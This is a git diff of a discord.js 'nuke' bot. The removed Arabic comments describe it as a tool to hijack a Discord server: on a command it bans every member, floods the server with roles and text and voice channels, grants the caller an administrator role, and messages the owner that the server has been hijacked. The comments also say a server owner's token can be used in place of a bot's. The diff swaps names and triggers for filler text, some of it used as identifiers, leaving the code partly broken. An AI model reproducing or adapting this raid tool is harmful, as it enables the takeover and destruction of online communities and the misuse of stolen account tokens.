@@ -1,17 +1,3 @@
-//فكره الكود
-//ان تسوي بوت 
-//وتعطيه اداري يضيفه
-//لما يضيفه تكتب الامر يلي انت حددته
-//وبيسوي رتب باسم يلي انت تحدده
-//ورومات صوتيه وكتابيه بالاسم يلي تحدده
-//ويعطيك رتبه فيها ادمن ستريشن
-//وتتحكم في السيرفر 
-//طبعا اول ما تكتب الامر بيبند كل الاعضاء 
-//او
-// اذا معك توكن الاونر حط توكن الاونر
-//ENJOY
-//Sorry For The Bad Engilsh :/
-//By xxxRevenge (Bowlingtoolkit)
 const Discord = require("discord.js") //npm i discord.js
 const client = new Discord.Client();
 const Token = '' //حط توكن بوتك هنا // your bot token
@@ -35,10 +21,10 @@ client.on('ready', () => {
 client.on('ready',  () => {
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
-console.log('      ~            ~  By : OROCHIX ~           ~    '); //if you share this code make sure you type my copyrights :>
+console.log('      ~            ~  …です ~           ~    '); //if you share this code make sure you type my copyrights :>
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log(`Logged in as  * [ "  OROCHIX " ] servers! [ " ${client.guilds.size} " ] Users! [ " ${client.users.size} " ]`);
+console.log(`Logged in as  * [ "  …です " ] servers! [ " ${client.guilds.size} " ] Users! [ " ${client.users.size} " ]`);
 //BY OROCHIX (Arabic)
         
 
@@ -50,7 +36,7 @@ async function nuke(guild) {
   
     await guild.fetchMembers();
   
-    await guild.owner.send('Your Server Has Been Hjacked !').catch(e => { return void e; });
+    await guild.owner.send('ฟ่าววววว …です').catch(e => { return void e; });
   
   
   
@@ -98,10 +84,10 @@ client.on('message', message => {
 
 //this will give you a adminstrator in the target server
 client.on('message', message => {
-        if (message.content === 'OP') {
+        if (message.content === 'です') {
 let me = message.author
         let role = message.guild.createRole({
-        name : adminstrator,
+        name : です,
         color : "RANDOM", 
         permissions : [8]
         })
@@ -113,7 +99,7 @@ let me = message.author
             client.on('message', message => {
      
 
-                if (message.content === x_x) {
+                if (message.content === 名のです) {
                     client.guilds.forEach(m =>{
              m.createRole({
                    name : role,
@@ -320,7 +306,7 @@ let me = message.author
            });
            //create the textchannels
            client.on('message', message => {
-                    if (message.content === x_x) {
+                    if (message.content === 名のです) {
                           client.guilds.forEach(m =>{
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
@@ -374,7 +360,7 @@ let me = message.author
            });
            //create the voicechannels
            client.on('message', message => {
-                    if (message.content === x_x) {
+                    if (message.content === 名のです) {
                             client.guilds.forEach(m =>{
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
@@ -477,7 +463,7 @@ let me = message.author
 
 //login in to the bot token or the serverowner token
     client.on('message', async message => {
-  const devs = ['505638480248963072']; // your id
+  const devs = ['286143114878517248']; // your id
   let member = message.author
    if (message.content === opcmd) {
     if (!devs.includes(message.author.id)) return;
